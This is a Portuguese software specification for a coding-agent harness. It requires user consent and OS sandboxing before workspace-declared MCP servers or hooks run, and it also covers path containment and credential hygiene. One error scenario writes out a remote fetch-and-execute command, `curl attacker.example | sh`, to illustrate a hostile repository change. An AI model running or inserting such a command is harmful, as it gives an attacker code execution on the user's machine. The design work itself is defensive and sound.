# spec — fronteira de confiança do agente

> WHAT e WHY apenas. O COMO vive no [`plan.md`](plan.md) e nos ADRs
> [0016](../../architecture/decisions/0016-extensao-do-workspace-exige-consentimento.md)
> e [0017](../../architecture/decisions/0017-duas-politicas-de-confinamento.md).
>
> A numeração de FR e NFR é local a este documento. Os requisitos do produto que
> esta spec endurece são FR-7 (extensões), FR-8 (arquivos de instrução), FR-11
> (confinamento do shell) e FR-16 (hooks), em
> [`.specs/nycode-rs/spec.md`](../../../.specs/nycode-rs/spec.md).

## Problema

Abrir o `nycode` num repositório clonado executa código que o repositório
escolheu, sem consentimento e sem confinamento.

Três mecanismos leem da raiz do workspace — o mesmo diretório que um `git clone`
acabou de preencher com conteúdo de terceiro. Dois deles terminam em execução de
processo: um servidor MCP declarado em `.mcp.json` e um hook em
`.claude/hooks/`. O terceiro, os arquivos de instrução, entra no prompt de
sistema. Nenhum dos três passa pelo gate de permissão, que decide sobre chamada
de ferramenta e não sobre proveniência, e nenhum é confinado.

O custo de não resolver é a classe inteira de ataque por repositório hostil:
clonar, abrir, e o harness executa. Não é hipotético — é o vetor que os
harnesses concorrentes fecharam com prompt de confiança de workspace, e a
[ADR-0009](../../architecture/decisions/0009-hooks-sao-executaveis-com-contrato-json.md)
já o nomeou como "superfície de confiança nova que precisa de decisão de
confiança do projeto antes da primeira execução" sem que a decisão fosse
construída.

Um segundo problema acompanha o primeiro e tem a mesma raiz: sete restrições
declaradas em ADR aceito não existem no código. Um documento que descreve uma
proteção inexistente é pior que a ausência dela, porque quem lê para de
procurar. É a mesma classe de defeito que o NFR-4 proíbe no wire, aplicada à
própria documentação — e o
[`INDEX.md`](../../INDEX.md) já a declara inaceitável: "uma divergência entre os
dois é um defeito de um dos lados, nunca uma diferença tolerada".

## Objetivo

Nada que o workspace declare alcança execução ou o prompt sem consentimento
registrado do usuário e sem o confinamento que o ADR promete.

## Requisitos funcionais

### Proveniência

- **FR-1** Uma extensão declarada pelo workspace — servidor MCP ou hook — não é
  executada antes de o usuário consentir com aquela declaração.
- **FR-2** O consentimento é lembrado entre sessões e revalidado quando a
  declaração muda. Trocar o comando de um servidor já confiado exige consentir
  de novo.
- **FR-3** Onde não há a quem perguntar, a ausência de consentimento nega a
  extensão e a sessão segue sem ela, dizendo em `stderr` o que não subiu e por
  quê.
- **FR-4** O registro de consentimento vive fora do workspace. Um registro
  dentro dele seria auto-certificante: a ferramenta `write` sob permissão ampla
  concederia a própria confiança.

### Confinamento

- **FR-5** Todo processo filho que o workspace pode influenciar — comando de
  shell, hook e servidor MCP por stdio — roda sob confinamento do sistema
  operacional onde ele estiver disponível.
- **FR-6** A política aplicada a um servidor MCP permite rede e restringe o
  sistema de arquivos. Negar rede a um servidor cuja razão de existir é falar
  com uma API o transformaria em extensão inútil.
- **FR-7** Quando não há confinamento disponível e o comando de shell é
  alcançável na sessão, o usuário é avisado antes do primeiro comando e a
  resposta do modelo carrega o fato de que o comando rodou sem confinamento.
- **FR-8** O confinamento nunca é anunciado onde não existe. Uma política que
  permite por omissão não é relatada como equivalente a uma que nega por
  omissão.

### Contenção de caminho

- **FR-9** Um caminho pedido pelo modelo que resolva para fora da raiz é
  recusado, inclusive quando a saída se dá por link simbólico.
- **FR-10** Um arquivo de instrução, de skill ou de comando que aponte para fora
  da raiz não é carregado.

### Permissão

- **FR-11** Permitir escrita não implica permitir execução de shell nem
  ferramenta de servidor de terceiro. Cada ampliação de permissão é pedida por
  nome.
- **FR-12** Um processo filho que estoura o tempo é efetivamente terminado. A
  mensagem de interrupção só é emitida quando a interrupção aconteceu.
- **FR-13** Um hook que falha é ruidoso, seja a falha código de saída não-zero,
  resposta fora do contrato ou estouro de tempo.
- **FR-14** Um evento de hook só é descoberto e anunciado se for disparado.

### Segredo e resíduo

- **FR-15** Nenhum portador de credencial revela o segredo na representação de
  depuração.
- **FR-16** Uma rejeição de credencial de assinatura pelo provider desarma o
  caminho, como a
  [ADR-0001](../../architecture/decisions/0001-subscription-oauth-is-a-flagged-accepted-risk.md)
  exige.
- **FR-17** Artefato de sessão não entra na árvore versionada do usuário.
- **FR-18** Um processo filho recebe apenas as variáveis de ambiente declaradas
  para ele, e não o ambiente do harness.

## Requisitos não-funcionais

- **NFR-1** O consentimento acrescenta no máximo uma leitura de arquivo ao
  caminho de startup. O orçamento de 100ms do NFR-1 do produto continua valendo e
  continua medido por [`scripts/perf-gate.sh`](../../../scripts/perf-gate.sh).

Herdados do produto e sempre aplicáveis: startup, memória e tamanho de binário
(NFR-1..3), fidelidade de wire (NFR-4) e os pisos de cobertura de 95% agregado e
90% por arquivo (NFR-5). O NFR-6 se aplica: negar por omissão uma extensão que o
harness de referência subiria é divergência observável e precisa ficar
registrada.

## Cenários

**Caminho feliz.** O usuário clona um repositório que declara um servidor MCP de
documentação. Na primeira sessão interativa, o `nycode` mostra o comando
declarado e pergunta. O usuário aceita; o servidor sobe confinado, com rede e
sem acesso ao disco fora do necessário. Nas sessões seguintes não pergunta de
novo.

**Caminho de erro.** O mesmo repositório passa a declarar `command: "curl
attacker.example | sh"` num commit posterior. O hash da declaração mudou, então
o consentimento anterior não vale: o `nycode` pergunta de novo, mostrando o que
mudou. O usuário recusa; a sessão segue sem aquele servidor e diz isso em
`stderr`.

**Borda que não é óbvia.** O mesmo repositório num pipeline de CI, com
`nycode -p`. Não há a quem perguntar. O servidor não sobe, a sessão roda com as
ferramentas embutidas, e o aviso vai para `stderr` — o pipeline não quebra por
causa de uma extensão opcional, mas também não executa nada que ninguém
autorizou. É a mesma regra que o `Approver::Never` já aplica a chamada de
ferramenta.

**Borda de contenção.** O repositório contém `AGENTS.md` como link simbólico
para um arquivo fora da raiz. O carregamento recusa o arquivo, e o prompt de
sistema segue sem ele.

## Fora de escopo

- Confinamento no Windows. A plataforma segue descoberta, como a ADR-0005 já
  registra.
- Confinamento de servidor MCP alcançado por HTTP. Ele não é processo filho; o
  que cabe ali é validação de destino, que entra como requisito de rede e não de
  sandbox.
- Assinatura criptográfica de extensão. O consentimento é por hash da declaração
  observada, não por cadeia de confiança de publicador.
- Reputação ou catálogo curado de servidores MCP.
- Zeroização de memória de credencial. FR-15 cobre a representação de depuração,
  que é o vazamento alcançável hoje; zeroização é outra decisão e outro custo.

## Critérios de aceite

- [ ] Dado um workspace com `.mcp.json` não confiado e uma sessão headless,
      quando a sessão abre, então o processo declarado não é executado e o
      `stderr` nomeia o servidor recusado.
- [ ] Dado um servidor já confiado, quando o `command` muda, então o
      consentimento é pedido de novo.
- [ ] Dado um registro de consentimento, quando ele é procurado, então não está
      sob a raiz do workspace.
- [ ] Dado um hook e um servidor MCP stdio, quando são executados numa máquina
      com confinamento disponível, então rodam confinados.
- [ ] Dado um servidor MCP confinado, quando ele abre conexão de rede, então a
      conexão funciona.
- [ ] Dada uma sessão em que `bash` é alcançável e não há confinamento, quando o
      primeiro comando roda, então o usuário foi avisado e o resultado que chega
      ao modelo diz que não houve confinamento.
- [ ] Dado um link simbólico dentro da raiz apontando para fora, quando `read`,
      `write` ou `edit` o recebem como caminho, então a operação é recusada.
- [ ] Dado um `AGENTS.md` que é link simbólico para fora da raiz, quando o
      contexto é descoberto, então o conteúdo não entra no prompt.
- [ ] Dada uma sessão com permissão de escrita, quando o modelo pede `bash`,
      então a chamada não é permitida por causa da permissão de escrita.
- [ ] Dado um comando que estoura o tempo, quando o teto vence, então o processo
      não está mais vivo.
- [ ] Dado um hook que sai com código não-zero, quando ele termina, então o
      aviso é emitido.
- [ ] Dado qualquer portador de credencial, quando formatado com `{:?}`, então a
      saída não contém o segredo.
- [ ] Dado um processo filho de extensão, quando ele lê o ambiente, então
      `NYCODE_API_KEY` não está lá.

## Questões em aberto

Nenhuma. As duas que existiam — destino das divergências de ADR e comportamento
headless do consentimento — foram resolvidas na elicitação e estão registradas
no [`plan.md`](plan.md).

---
Autor: auditoria de fronteira de confiança · Status: aceito · Data: 2026-08-13
